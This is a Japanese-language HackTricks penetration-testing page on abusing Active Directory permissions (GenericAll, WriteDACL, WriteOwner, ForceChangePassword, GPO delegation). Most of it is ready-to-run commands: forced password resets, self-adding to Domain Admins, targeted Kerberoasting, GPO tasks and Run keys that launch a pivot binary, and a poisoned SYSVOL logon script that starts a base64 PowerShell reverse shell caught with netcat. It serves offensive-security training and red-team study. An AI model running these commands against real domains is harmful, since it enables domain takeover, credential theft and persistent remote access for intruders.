# Active Directory ACLs/ACEs の悪用

{{#include ../../../banners/hacktricks-training.md}}

**このページは主に** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **と** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**の技術の要約です。詳細は元の記事を参照してください。**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **ユーザーに対する GenericAll 権限**

この権限は攻撃者に対象ユーザーアカウントを完全に制御する能力を与えます。`Get-ObjectAcl` コマンドで `GenericAll` 権限が確認されると、攻撃者は次のことができます:

- **対象のパスワードを変更する**: `net user <username> <password> /domain` を使用して、攻撃者はユーザーのパスワードをリセットできます。
- Linux からは、SAMR を介して Samba の `net rpc` で同様のことができます:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **アカウントが無効になっている場合は、UACフラグをクリアする**: `GenericAll` は `userAccountControl` の編集を許可します。Linux から、BloodyAD は `ACCOUNTDISABLE` フラグを削除できます:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: ユーザーのアカウントにSPNを割り当ててkerberoastableにし、その後RubeusとtargetedKerberoast.pyを使用してticket-granting ticket (TGT)ハッシュを抽出し、crackを試みる。
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: ユーザーの pre-authentication を無効にし、そのアカウントを ASREPRoasting に対して脆弱にします。
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: ユーザーに `GenericAll` がある場合、証明書ベースの資格情報を追加して、パスワードを変更することなくそのユーザーとして認証できます。参照:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll** がグループに対する権利

この権限により、攻撃者は `Domain Admins` のようなグループで `GenericAll` 権限を持つときにグループメンバーシップを操作できます。`Get-NetGroup` でグループの識別名 (distinguished name) を特定した後、攻撃者は以下を行えます:

- **Domain Admins グループに自分自身を追加する**: これは直接コマンドを使用するか、Active Directory や PowerSploit のようなモジュールを使って行えます。
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linuxからは、BloodyADを利用して、対象のグループに対してGenericAll/Writeのメンバーシップを保持している場合に任意のグループへ自分を追加することもできます。ターゲットグループが“Remote Management Users”にネストされている場合、そのグループを適用しているホストでは即座にWinRMアクセスを取得できます:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

コンピューターオブジェクトやユーザーアカウントでこれらの権限を保持していると、次のことが可能になります:

- **Kerberos Resource-based Constrained Delegation**: コンピューターオブジェクトを乗っ取ることが可能になります。
- **Shadow Credentials**: この手法を用いて、影の資格情報を作成する権限を悪用し、コンピューターまたはユーザーアカウントになりすますことができます。

## **WriteProperty on Group**

あるユーザーが特定のグループ（例: `Domain Admins`）に対するすべてのオブジェクトの`WriteProperty`権限を持っている場合、次のことが可能になります:

- **Add Themselves to the Domain Admins Group**: `net user` と `Add-NetGroupUser` コマンドを組み合わせることで実現可能で、この方法によりドメイン内での権限昇格が可能になります。
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group

この特権により、攻撃者はグループメンバーシップを直接操作するコマンドを使って、`Domain Admins` のような特定のグループに自分自身を追加できます。以下のコマンドシーケンスを使用すると、自分自身を追加できます:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

同様の権限で、攻撃者は当該グループに対して `WriteProperty` 権限を持っている場合、グループのプロパティを変更することで自分自身を直接グループに追加できます。この権限の確認と実行は次の方法で行われます:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

ユーザーに対して`User-Force-Change-Password`の`ExtendedRight`を保持していると、現在のパスワードを知らなくてもパスワードをリセットできます。この権利の確認および悪用はPowerShellや他のコマンドラインツールで行え、対話型セッションや非対話型環境向けのワンライナーなど、ユーザーのパスワードをリセットする複数の方法が提供されています。コマンドは単純なPowerShell呼び出しからLinux上での`rpcclient`の使用まで及び、attack vectorsの多様性を示しています。
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

攻撃者があるグループに対して`WriteOwner`権限を持っていることを発見した場合、そのグループの所有者を自分に変更できます。対象のグループが`Domain Admins`である場合、この操作は特に影響が大きく、所有権を変更することでグループの属性やメンバーシップに対してより広範な制御が可能になります。手順は`Get-ObjectAcl`で正しいオブジェクトを特定し、`Set-DomainObjectOwner`を使用して所有者をSIDまたは名前で変更する、というものです。
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on ユーザー**

この権限により、攻撃者はユーザーの属性を変更できます。具体的には、`GenericWrite` アクセスを持つことで、攻撃者はユーザーのログオンスクリプトのパスを変更し、ユーザーのログオン時に悪意のあるスクリプトを実行させることができます。これは、`Set-ADObject` コマンドを使用してターゲットユーザーの `scriptpath` プロパティを攻撃者のスクリプトを指すように更新することで実現します。
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

この特権により、攻撃者は自身や他のユーザーを特定のグループに追加するなど、グループのメンバーシップを操作できます。このプロセスでは credential object を作成し、それを使ってユーザーをグループに追加または削除し、PowerShell コマンドでメンバーシップの変更を確認します。
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux上では、Samba `net` はグループに対して `GenericWrite` を保持している場合、メンバーの追加/削除が可能です（PowerShell/RSAT が利用できない場合に便利です）：
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

AD オブジェクトを所有し、かつ `WriteDACL` 権限を持っていると、攻撃者はそのオブジェクトに対して自分自身に `GenericAll` 権限を付与できます。これは ADSI の操作によって達成され、オブジェクトの完全な制御とグループメンバーシップの変更能力を可能にします。しかしながら、Active Directory モジュールの `Set-Acl` / `Get-Acl` コマンドレットを使ってこれらの権限を悪用しようとする際には制限があります。
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner を使った迅速な乗っ取り (PowerView)

ユーザーまたはサービスアカウントに対して `WriteOwner` と `WriteDacl` を持っている場合、PowerView を使って古いパスワードを知らなくてもアカウントを完全に制御し、パスワードをリセットできます:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
注意:
- 自分に `WriteOwner` 権限しかない場合は、まず所有者を自分に変更する必要があるかもしれません:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- パスワードリセット後に、任意のプロトコル (SMB/LDAP/RDP/WinRM) でアクセスを検証する。

## **ドメイン上でのレプリケーション (DCSync)**

The DCSync attack leverages specific replication permissions on the domain to mimic a Domain Controller and synchronize data, including user credentials. This powerful technique requires permissions like `DS-Replication-Get-Changes`, allowing attackers to extract sensitive information from the AD environment without direct access to a Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPOの委任 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPOの委任

Delegated access to manage Group Policy Objects (GPOs) can present significant security risks. For instance, if a user such as `offense\spotless` is delegated GPO management rights, they may have privileges like **WriteProperty**, **WriteDacl**, and **WriteOwner**. These permissions can be abused for malicious purposes, as identified using PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO権限の列挙

To identify misconfigured GPOs, PowerSploit's cmdlets can be chained together. This allows for the discovery of GPOs that a specific user has permissions to manage: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**特定のポリシーが適用されているコンピューター**: It's possible to resolve which computers a specific GPO applies to, helping understand the scope of potential impact. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**特定のコンピューターに適用されているポリシー**: To see what policies are applied to a particular computer, commands like `Get-DomainGPO` can be utilized.

**特定のポリシーが適用されているOU**: Identifying organizational units (OUs) affected by a given policy can be done using `Get-DomainOU`.

You can also use the tool [**GPOHound**](https://github.com/cogiceo/GPOHound) to enumerate GPOs and find issues in them.

### GPOの悪用 - New-GPOImmediateTask

Misconfigured GPOs can be exploited to execute code, for example, by creating an immediate scheduled task. This can be done to add a user to the local administrators group on affected machines, significantly elevating privileges:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy moduleがインストールされている場合、新しい GPO を作成してリンクし、registry values のような設定（preferences）を行って影響を受けたコンピュータ上で backdoors を実行させることができます。この方法は、GPO が更新され、ユーザがコンピュータにログインして初めて実行されます:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse は、新しい GPOs を作成することなく、既存の GPOs にタスクを追加したり設定を変更したりして悪用する方法を提供します。このツールは、変更を適用する前に既存の GPOs を修正するか、RSAT ツールを使って新しいものを作成することを必要とします:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### ポリシーの強制更新

GPOの更新は通常約90分ごとに行われます。このプロセスを速めるため、特に変更を適用した直後には、ターゲットコンピュータで`gpupdate /force`コマンドを使用して即時のポリシー更新を強制できます。このコマンドにより、次回の自動更新サイクルを待つことなくGPOへの変更が適用されます。

### 内部の仕組み

特定のGPO（例: `Misconfigured Policy`）のScheduled Tasksを調べると、`evilTask`のようなタスクが追加されていることが確認できます。これらのタスクは、システムの動作を変更したり権限を昇格させたりすることを目的としたスクリプトやコマンドラインツールによって作成されます。

`New-GPOImmediateTask`で生成されたXML構成ファイルに示されるタスクの構造は、実行されるコマンドやそのトリガーを含め、スケジュールタスクの詳細を示します。このファイルは、GPO内でスケジュールタスクがどのように定義・管理されているかを表しており、ポリシー適用の一環として任意のコマンドやスクリプトを実行する手段を提供します。

### ユーザーとグループ

GPOはターゲットシステム上のユーザーやグループのメンバーシップを操作することも可能にします。Users and Groupsポリシーファイルを直接編集することで、攻撃者はローカルの`administrators`グループのような特権グループにユーザーを追加できます。これはGPO管理権限の委任を通じて可能となり、ポリシーファイルに新しいユーザーを含めたりグループメンバーシップを変更したりすることが許されます。

Users and Groups用のXML構成ファイルは、これらの変更がどのように実装されるかを示します。このファイルにエントリを追加することで、特定のユーザーに影響を受けるシステム全体で昇格した権限を付与できます。この方法はGPO操作を通じた直接的な権限昇格手段を提供します。

さらに、logon/logoff scriptsの利用、autoruns用のレジストリキーの変更、.msi files経由でのソフトウェアインストール、service configurationsの編集といった、コード実行や永続化のための追加手法も考慮できます。これらの技術は、GPOの悪用を通じてアクセスを維持しターゲットシステムを制御するさまざまな手段を提供します。

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` または `\\<dc>\NETLOGON\` の下にある書き込み可能なパスは、GPOを通じてユーザーログオン時に実行されるログオンスクリプトを改ざんすることを可能にします。これにより、ログオンしているユーザーのセキュリティコンテキストでコードが実行されます。

### ログオンスクリプトの特定
- ユーザー属性を確認して設定されたログオンスクリプトを調べる:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- ドメイン共有をクロールして、ショートカットやスクリプトへの参照を検出する:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- `.lnk` ファイルを解析して、SYSVOL/NETLOGON を指すターゲットを解決する（有用な DFIR トリックで、直接 GPO access を持たない attackers に役立つ）:
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound は、存在する場合、ユーザー ノードに `logonScript` (scriptPath) 属性を表示します。

### 書き込みアクセスを検証する（共有一覧を信用しない）
自動化ツールは SYSVOL/NETLOGON を読み取り専用として表示することがありますが、基盤となる NTFS ACLs が書き込みを許可する場合があります。必ずテストしてください:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
ファイルサイズや mtime が変更されている場合、書き込み権限があります。変更する前にオリジナルを保存してください。

### Poison a VBScript logon script for RCE
PowerShell reverse shell を起動するコマンドを追記し（revshells.com で生成したものを使用）、業務機能を壊さないように元のロジックは維持してください:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
ホストで待ち受け、次のインタラクティブログオンを待ってください:
```bash
rlwrap -cAr nc -lnvp 443
```
メモ:
- 実行はログオン中のユーザーのトークンで行われます（not SYSTEM）。スコープはそのスクリプトを適用している GPO リンク（OU、site、domain）です。
- 使用後は元のコンテンツ/タイムスタンプを復元してクリーンアップしてください。


## 参考資料

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
